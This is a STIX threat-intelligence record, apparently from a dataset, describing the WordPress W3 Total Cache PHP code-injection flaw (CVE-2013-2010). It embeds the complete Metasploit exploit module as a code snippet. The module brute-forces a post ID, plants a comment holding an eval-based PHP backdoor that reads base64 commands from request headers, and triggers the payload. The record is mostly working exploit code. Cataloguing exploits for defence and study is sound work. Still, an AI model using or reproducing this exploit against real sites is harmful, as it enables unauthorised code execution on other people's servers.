{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e3ac68f-af00-4198-a58f-a06441cdcc0b",
    "created": "2024-08-14T17:12:23.968586Z",
    "modified": "2024-08-14T17:12:23.96859Z",
    "name": "WordPress W3 Total Cache PHP Code Execution",
    "description": " This module exploits a PHP Code Injection vulnerability against WordPress plugin W3 Total Cache for versions up to and including 0.9.2.8.  WP Super Cache 1.2 or older is also reported as vulnerable.  The vulnerability is due to the handling of certain macros such as mfunc, which allows arbitrary PHP code injection.  A valid post ID is needed in order to add the malicious comment.  If the POSTID option isn't specified then the module will automatically find or bruteforce one.  Also, if anonymous comments aren't allowed, then a valid username and password must be provided.  In addition the \"A comment is held for moderation\" option on WordPress must be unchecked for successful exploitation.  This module has been tested against WordPress 3.5 and W3 Total Cache 0.9.2.3 on a Ubuntu 10.04 system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_total_cache_exec.rb",
            "external_id": "wp_total_cache_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2010"
        },
        {
            "source_name": "reference",
            "url": "http://wordpress.org/support/topic/pwn3d"
        },
        {
            "source_name": "reference",
            "url": "http://www.acunetix.com/blog/web-security-zone/wp-plugins-remote-code-execution/"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6622"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::Remote::HttpClient\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress W3 Total Cache PHP Code Execution',\n      'Description'    => %q{\n          This module exploits a PHP Code Injection vulnerability against WordPress plugin\n        W3 Total Cache for versions up to and including 0.9.2.8.  WP Super Cache 1.2 or older\n        is also reported as vulnerable.  The vulnerability is due to the handling of certain\n        macros such as mfunc, which allows arbitrary PHP code injection.  A valid post ID is\n        needed in order to add the malicious comment.  If the POSTID option isn't specified,\n        then the module will automatically find or bruteforce one.  Also, if anonymous comments\n        aren't allowed, then a valid username and password must be provided.  In addition,\n        the \"A comment is held for moderation\" option on WordPress must be unchecked for\n        successful exploitation.  This module has been tested against WordPress 3.5 and\n        W3 Total Cache 0.9.2.3 on a Ubuntu 10.04 system.\n      },\n      'Author'\t=>\n        [\n          'Unknown', # Vulnerability discovery\n          'juan vazquez', # Metasploit module\n          'hdm', # Metasploit module\n          'Christian Mehlmauer' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-2010' ],\n          [ 'OSVDB', '92652' ],\n          [ 'BID', '59316' ],\n          [ 'URL', 'http://wordpress.org/support/topic/pwn3d' ],\n          [ 'URL', 'http://www.acunetix.com/blog/web-security-zone/wp-plugins-remote-code-execution/' ],\n          [ 'WPVDB', '6622' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n        },\n      'Targets'        => [ ['Wordpress 3.5', {}] ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-04-17'\n      ))\n\n      register_options(\n        [\n          OptInt.new('POSTID', [ false, \"The post ID where publish the comment\" ]),\n          OptString.new('USERNAME', [ false,  \"The user to authenticate as (anonymous if username not provided)\"]),\n          OptString.new('PASSWORD', [ false,  \"The password to authenticate with (anonymous if password not provided)\" ])\n        ])\n\n      register_advanced_options(\n        [\n            OptInt.new('MIN_POST_ID', [ false, 'Specify the first post_id used for bruteforce', 1]),\n            OptInt.new('MAX_POST_ID', [ false, 'Specify the last post_id used for bruteforce', 1000])\n        ])\n  end\n\n  def post_auth?\n    require_auth?\n  end\n\n  def require_auth?\n    @user = datastore['USERNAME']\n    @password = datastore['PASSWORD']\n\n    if @user and @password and not @user.empty? and not @password.empty?\n      return true\n    else\n      return false\n    end\n  end\n\n  def post_comment(text)\n    php_payload = \"#{text}<!--mfunc if(isset($_SERVER['HTTP_SUM'])) { if (sha1($_SERVER['HTTP_SUM']) == '#{@sum}' ) { eval(base64_decode($_SERVER['HTTP_CMD'])); } } --><!--/mfunc-->\"\n\n    if @auth\n      uri = wordpress_post_comment_auth(php_payload, @post_id, @cookie)\n    else\n      author = rand_text_alpha(8)\n      author_email = \"#{rand_text_alpha(3)}@#{rand_text_alpha(3)}.com\"\n      author_url = rand_text_alpha(8)\n      uri = wordpress_post_comment_no_auth(php_payload,\n          @post_id,\n          author,\n          author_email,\n          author_url\n      )\n      @unauth_cookie = wordpress_get_unauth_comment_cookies(author, author_email, author_url)\n    end\n    uri\n  end\n\n  def exploit\n    unless wordpress_and_online?\n      fail_with(Failure::NoTarget, \"#{target_uri} does not seeem to be Wordpress site\")\n    end\n\n    @auth = require_auth?\n\n    if @auth\n      print_status(\"Trying to login...\")\n      @cookie = wordpress_login(@user, @password)\n      if @cookie.nil?\n        fail_with(Failure::NoAccess, \"#{peer} - Login wasn't successful\")\n      end\n      print_good(\"Login Successful\")\n      store_valid_credential(user: @user, private: @password, proof: @cookie)\n    else\n      print_status(\"Trying unauthenticated exploitation...\")\n    end\n\n    if datastore['POSTID'] and datastore['POSTID'] != 0\n      @post_id = datastore['POSTID']\n      print_status(\"Using the user supplied POST ID #{@post_id}...\")\n    else\n      print_status(\"Trying to get posts from feed...\")\n      all_posts = wordpress_get_all_blog_posts_via_feed\n      # First try all blog posts provided by feed\n      if all_posts\n        all_posts.each do |p|\n          vprint_status(\"Checking #{p}...\")\n          enabled = wordpress_post_comments_enabled?(p, @cookie)\n          @post_id = get_post_id_from_body(enabled)\n          if @post_id\n            print_status(\"Found Post POST ID #{@post_id}...\")\n            break\n          end\n        end\n      end\n      # if nothing found, bruteforce a post id\n      unless @post_id\n        print_status(\"Nothing found. Trying to brute force a valid POST ID...\")\n        min_post_id = datastore['MIN_POST_ID']\n        max_post_id = datastore['MAX_POST_ID']\n        @post_id = wordpress_bruteforce_valid_post_id_with_comments_enabled(min_post_id, max_post_id, @cookie)\n        if @post_id.nil?\n          fail_with(Failure::BadConfig, \"#{peer} - Unable to post without a valid POST ID where comment\")\n        else\n          print_status(\"Using the brute forced POST ID #{@post_id}...\")\n        end\n      end\n    end\n\n    random_test = rand_text_alpha(64)\n    @sum = Rex::Text.sha1(random_test)\n\n    print_status(\"Injecting the PHP Code in a comment...\")\n    text = Rex::Text::rand_text_alpha(10)\n    post_uri = post_comment(text)\n    if post_uri.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Expected redirection not returned\")\n    end\n\n    print_status(\"Executing the payload...\")\n    options = {\n        'method' => 'GET',\n        'uri' => post_uri,\n        'headers' => {\n            'Cmd' => Rex::Text.encode_base64(payload.encoded),\n            'Sum' => random_test\n        }\n    }\n    options.merge!({'cookie' => @cookie}) if @auth\n    # Used to see anonymous, moderated comments\n    options.merge!({'cookie' => @unauth_cookie}) if @unauth_cookie\n    res = send_request_cgi(options)\n    if res and res.code == 301\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected redirection, maybe comments are moderated\")\n    end\n\n    if res and !res.body.match(/#{Regexp.escape(text)}/)\n      fail_with(Failure::Unknown, \"#{peer} - Comment not in post, maybe comments are moderated\")\n    end\n\n  end\n\n  def check\n    res = wordpress_and_online?\n    unless res\n      vprint_error(\"#{peer} does not seeem to be Wordpress site\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.headers['X-Powered-By'] and res.headers['X-Powered-By'] =~ /W3 Total Cache\\/([0-9\\.]*)/\n      version = $1\n      if version <= \"0.9.2.8\"\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Safe\n      end\n    end\n\n    if res.body and (res.body =~ /Performance optimized by W3 Total Cache/ or res.body =~ /Cached page generated by WP-Super-Cache/)\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-17",
    "x_mitre_platforms": [
        "['php']"
    ]
}